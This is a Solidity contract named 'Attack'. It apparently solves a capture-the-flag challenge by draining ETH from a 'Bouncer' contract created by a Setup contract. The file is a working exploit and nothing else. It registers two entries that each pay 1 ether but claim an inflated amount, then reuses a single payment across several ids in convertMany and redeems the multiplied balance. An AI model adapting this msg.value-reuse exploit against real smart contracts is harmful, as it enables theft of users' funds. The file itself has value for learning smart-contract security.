pragma solidity 0.8.7;

import "./Setup.sol";

contract Attack {
    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    Setup setup;
    Bouncer bouncer;
    uint withdrawalAmount;

    constructor(address _setup) {
        setup = Setup(_setup);
        bouncer = setup.bouncer();
    }

    function attack() external payable {
        uint256 bouncerBalance = address(bouncer).balance;

        uint256 _amount = bouncerBalance + 2 * 1 ether;
        bouncer.enter{value: 1 ether}(ETH, _amount);
        bouncer.enter{value: 1 ether}(ETH, _amount);

        withdrawalAmount = _amount;
    }

    function attack2() external payable {
        uint256[] memory ids = new uint256[](2);
        for (uint256 i = 0; i < ids.length; i++) {
            ids[i] = i;
        }
        bouncer.convertMany{value: withdrawalAmount}(address(this), ids);

        bouncer.redeem(ERC20Like(ETH), withdrawalAmount * ids.length);
    }
}
